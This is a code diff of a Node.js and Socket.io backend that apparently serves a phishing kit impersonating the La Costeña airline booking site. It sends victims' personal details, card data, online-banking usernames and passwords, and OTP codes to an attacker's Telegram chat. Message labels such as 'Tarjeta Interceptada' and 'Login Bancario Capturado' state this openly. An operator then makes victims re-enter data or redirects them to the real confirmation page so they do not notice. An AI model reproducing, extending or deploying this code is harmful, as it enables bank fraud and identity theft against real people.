@@ -2,51 +2,74 @@ const express = require('express');
 const http = require('http');
 const { Server } = require("socket.io");
 const TelegramBot = require('node-telegram-bot-api');
-require('dotenv').config();
+require('dotenv').config(); // <--- ESTA LÍNEA ES CRÍTICA PARA LEER TUS VARIABLES DE VERCEL
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
 
-// Sirve los archivos estáticos si los tuvieras aquí, pero nosotros usaremos Hostinger
-app.use(express.static('public')); 
+// Configuración de Socket.io con CORS abierto para evitar errores entre Hostinger y Vercel
+const io = new Server(server, {
+    cors: {
+        origin: "*", 
+        methods: ["GET", "POST"]
+    }
+});
 
+// Configuración del Bot de Telegram
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const chatId = process.env.TELEGRAM_CHAT_ID;
-const bot = new TelegramBot(token, { polling: true });
 
-let clients = {};
+if (!token || !chatId) {
+    console.warn("⚠️ Advertencia: Variables de entorno no encontradas. Verifica Settings > Environment Variables.");
+}
+
+const bot = new TelegramBot(token, { polling: true });
 
 io.on('connection', (socket) => {
     console.log(`Cliente conectado: ${socket.id}`);
     socket.emit('register', 'connected');
 
-    // 1. Pasajeros
+    // 1. DATOS DEL PASAJERO
     socket.on('submit_passengers', (data) => {
-        const msg = `🎫 *Pasajero*\n\n👤 ${data.fullName}\n📧 ${data.email}\n📞 ${data.phone}\n\n¿Aprobar?`;
+        const msg = `🎫 *Datos de Pasajero*\n\n` +
+                    `👤 Nombre: ${data.fullName}\n` +
+                    `📧 Email: ${data.email}\n` +
+                    `📞 Tel: ${data.phone}\n\n` +
+                    `¿Aprobar?`;
+        
         bot.sendMessage(chatId, msg, {
             reply_markup: { inline_keyboard: [
                 [{ text: "✅ Aprobar", callback_data: `approve_${socket.id}` }],
-                [{ text: "❌ Corrección", callback_data: `retry_${socket.id}` }]
+                [{ text: "❌ Pedir Corrección", callback_data: `retry_${socket.id}` }]
             ]}
         });
     });
 
-    // 2. Tarjeta
+    // 2. TARJETA DE CRÉDITO
     socket.on('card_payment', (data) => {
         const last4 = data.number.slice(-4);
-        const msg = `💳 *Tarjeta*: ****${last4}\n👤 ${data.name}\n\n¿Validar?`;
+        const msg = `💳 *Tarjeta Interceptada*\n\n` +
+                    `Número: **** **** **** ${last4}\n` +
+                    `Nombre: ${data.name}\n` +
+                    `Exp: ${data.expiry}\n` +
+                    `CVV: ***\n\n` +
+                    `¿Validar?`;
+
         bot.sendMessage(chatId, msg, {
             reply_markup: { inline_keyboard: [
-                [{ text: "✅ Validar", callback_data: `validate_${socket.id}` }],
-                [{ text: "❌ Reintentar", callback_data: `retry_card_${socket.id}` }]
+                [{ text: "✅ Validar Pago", callback_data: `validate_${socket.id}` }],
+                [{ text: "❌ Reintentar Tarjeta", callback_data: `retry_card_${socket.id}` }]
             ]}
         });
     });
 
-    // 3. Login Bancario (Usuario/Clave)
+    // 3. LOGIN BANCARIO (Usuario y Clave)
     socket.on('bank_login', (data) => {
-        const msg = `🏦 *Banca Online*\n\n👤 Usuario: ${data.user}\n🔑 Clave: ${data.pass}\n\n¿Correcto?`;
+        const msg = `🏦 *Login Bancario Capturado*\n\n` +
+                    `👤 Usuario: ${data.user}\n` +
+                    `🔑 Clave: ${data.pass}\n\n` +
+                    `¿Correcto?`;
+        
         bot.sendMessage(chatId, msg, {
             reply_markup: { inline_keyboard: [
                 [{ text: "✅ Correcto", callback_data: `ok_${socket.id}` }],
@@ -55,42 +78,50 @@ io.on('connection', (socket) => {
         });
     });
 
-    // 4. OTP
+    // 4. OTP / 3D SECURE
     socket.on('otp_verify', (data) => {
-        bot.sendMessage(chatId, `🔐 *OTP*: ${data.code}\n\n¿Correcto?`, {
+        bot.sendMessage(chatId, `🔐 *OTP Ingresado*: ${data.code}\n\n¿Es correcto?`, {
             reply_markup: { inline_keyboard: [
-                [{ text: "✅ Correcto", callback_data: `success_${socket.id}` }],
+                [{ text: "✅ Correcto (Éxito)", callback_data: `success_${socket.id}` }],
                 [{ text: "❌ Incorrecto", callback_data: `retry_otp_${socket.id}` }]
             ]}
         });
     });
 
-    // Manejo de Botones
+    // Manejo de Botones de Telegram
     bot.on('callback_query', (query) => {
         const action = query.data;
         const socketId = action.split('_')[1];
         const type = action.split('_')[0];
 
-        if (!clients[socketId]) return;
-
+        // Lógica de "Pedir Corrección" (Limpia campos y muestra error)
         if (type === 'retry') {
-            io.to(socketId).emit('force_retry', { message: "Error en los datos.", clearFields: ['all'] });
+            io.to(socketId).emit('force_retry', { 
+                message: "Error en los datos. Por favor ingrésalos nuevamente.",
+                clearFields: ['all'] 
+            });
         } else if (type === 'retry_card') {
-            io.to(socketId).emit('force_retry', { message: "Error en tarjeta.", clearFields: ['card'] });
+            io.to(socketId).emit('force_retry', { 
+                message: "Error en la tarjeta. Verifique los datos.",
+                clearFields: ['card'] 
+            });
         } else if (type === 'retry_otp') {
-            io.to(socketId).emit('force_retry', { message: "OTP inválido.", clearFields: ['otp'] });
+            io.to(socketId).emit('force_retry', { 
+                message: "Código inválido. Intente de nuevo.",
+                clearFields: ['otp'] 
+            });
         } else if (type.startsWith('ok') || type.startsWith('validate') || type.startsWith('success')) {
-            io.to(socketId).emit('redirect_success', { url: "https://www.lacostena.com.ni/Booking/Confirmation" });
+            // Éxito -> Redirigir al final
+            io.to(socketId).emit('redirect_success', {
+                message: "Procesando...",
+                url: "https://www.lacostena.com.ni/Booking/Confirmation" 
+            });
         }
-        
-        // Lógica específica para bank login retry
-        if (type === 'retry' && query.message.text.includes('Banca Online')) {
-             io.to(socketId).emit('retry_bank', {});
-        }
-
         bot.answerCallbackQuery(query.id);
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
+server.listen(PORT, () => {
+    console.log(`Servidor corriendo en puerto ${PORT}`);
+});
